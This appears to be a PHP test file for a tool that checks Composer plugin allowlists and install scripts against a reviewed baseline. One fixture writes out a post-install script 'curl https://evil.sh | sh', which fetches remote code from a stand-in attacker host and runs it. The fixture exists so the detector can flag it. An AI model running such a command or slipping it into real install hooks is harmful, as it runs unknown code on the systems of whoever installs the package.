<?php

function composerPolicyFixture(string $name, array $composer): string
{
    $dir = dirname(__DIR__, 3).'/storage/framework/testing/baseline/composer-policy/'.$name;

    if (! is_dir($dir)) {
        mkdir($dir, 0777, true);
    }

    file_put_contents($dir.'/composer.json', json_encode($composer));

    return $dir.'/composer.json';
}

function composerPolicyBaseline(string $name, array $scripts): string
{
    $path = dirname(__DIR__, 3).'/storage/framework/testing/baseline/composer-policy/'.$name.'-baseline.json';
    file_put_contents($path, json_encode(['scripts' => $scripts]));

    return $path;
}

function runComposerPolicy(array $args): array
{
    $command = [
        PHP_BINARY,
        dirname(__DIR__, 3).'/tools/baseline/composer-policy.php',
        '--format=json',
        ...$args,
    ];

    $descriptor = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $process = proc_open($command, $descriptor, $pipes, dirname(__DIR__, 3));
    if (! is_resource($process)) {
        throw new RuntimeException('Unable to start composer-policy');
    }

    $stdout = stream_get_contents($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    $code = proc_close($process);

    return ['code' => $code, 'stdout' => (string) $stdout, 'stderr' => (string) $stderr];
}

function composerPolicyAllowlist(): string
{
    return dirname(__DIR__, 3).'/tools/baseline/composer-plugin-allowlist.json';
}

it('accepts plugins that match the approved allowlist', function () {
    $composer = composerPolicyFixture('plugins-ok', [
        'config' => ['allow-plugins' => ['pestphp/pest-plugin' => true, 'php-http/discovery' => true]],
    ]);

    $result = runComposerPolicy(['--check=plugins', '--composer='.$composer, '--allowlist='.composerPolicyAllowlist()]);

    expect($result['code'])->toBe(0)
        ->and(json_decode($result['stdout'], true)['violations'])->toBe(0);
});

it('rejects an unapproved enabled plugin', function () {
    $composer = composerPolicyFixture('plugins-bad', [
        'config' => ['allow-plugins' => ['evil/plugin' => true]],
    ]);

    $result = runComposerPolicy(['--check=plugins', '--composer='.$composer, '--allowlist='.composerPolicyAllowlist()]);

    expect($result['code'])->toBe(1)
        ->and($result['stdout'])->toContain('unapproved composer plugin enabled: evil/plugin');
});

it('rejects a wildcard plugin entry', function () {
    $composer = composerPolicyFixture('plugins-wildcard', [
        'config' => ['allow-plugins' => ['*' => true]],
    ]);

    $result = runComposerPolicy(['--check=plugins', '--composer='.$composer, '--allowlist='.composerPolicyAllowlist()]);

    expect($result['code'])->toBe(1)
        ->and($result['stdout'])->toContain('wildcard');
});

it('accepts scripts matching the reviewed baseline', function () {
    $composer = composerPolicyFixture('scripts-ok', [
        'scripts' => ['post-autoload-dump' => ['@php artisan package:discover --ansi']],
    ]);
    $baseline = composerPolicyBaseline('scripts-ok', [
        'post-autoload-dump' => ['@php artisan package:discover --ansi'],
    ]);

    $result = runComposerPolicy(['--check=scripts', '--composer='.$composer, '--baseline='.$baseline]);

    expect($result['code'])->toBe(0)
        ->and(json_decode($result['stdout'], true)['violations'])->toBe(0);
});

it('rejects a newly added composer script', function () {
    $composer = composerPolicyFixture('scripts-added', [
        'scripts' => [
            'post-install-cmd' => ['@php artisan migrate --force'],
        ],
    ]);
    $baseline = composerPolicyBaseline('scripts-added', []);

    $result = runComposerPolicy(['--check=scripts', '--composer='.$composer, '--baseline='.$baseline]);

    expect($result['code'])->toBe(1)
        ->and($result['stdout'])->toContain('new composer script')
        ->and($result['stdout'])->toContain('post-install-cmd');
});

it('rejects dangerous script content even when baselined', function () {
    $command = '@php -r "file_exists(\'.env\') || copy(\'.env.example\', \'.env\');"';
    $composer = composerPolicyFixture('scripts-danger', [
        'scripts' => ['post-install-cmd' => ['curl https://evil.sh | sh']],
    ]);
    $baseline = composerPolicyBaseline('scripts-danger', [
        'post-install-cmd' => [$command],
    ]);

    $result = runComposerPolicy(['--check=scripts', '--composer='.$composer, '--baseline='.$baseline]);

    expect($result['code'])->toBe(1)
        ->and($result['stdout'])->toContain('dangerous pattern');
});

it('rejects a modified baselined script', function () {
    $composer = composerPolicyFixture('scripts-modified', [
        'scripts' => ['post-update-cmd' => ['@php artisan vendor:publish --tag=laravel-assets --ansi --force', '@php artisan boost:update --ansi', '@php artisan down']],
    ]);
    $baseline = composerPolicyBaseline('scripts-modified', [
        'post-update-cmd' => ['@php artisan vendor:publish --tag=laravel-assets --ansi --force', '@php artisan boost:update --ansi'],
    ]);

    $result = runComposerPolicy(['--check=scripts', '--composer='.$composer, '--baseline='.$baseline]);

    expect($result['code'])->toBe(1)
        ->and($result['stdout'])->toContain('differs from the reviewed baseline');
});

it('updates the baseline with --update and passes afterwards', function () {
    $composer = composerPolicyFixture('scripts-update', [
        'scripts' => ['pre-autoload-dump' => ['Composer\Config::disableProcessTimeout']],
    ]);
    $baseline = composerPolicyBaseline('scripts-update', []);

    $result = runComposerPolicy(['--check=scripts', '--composer='.$composer, '--baseline='.$baseline, '--update']);

    expect($result['code'])->toBe(0)
        ->and($result['stderr'])->toContain('baseline updated');

    $after = runComposerPolicy(['--check=scripts', '--composer='.$composer, '--baseline='.$baseline]);

    expect($after['code'])->toBe(0);
});
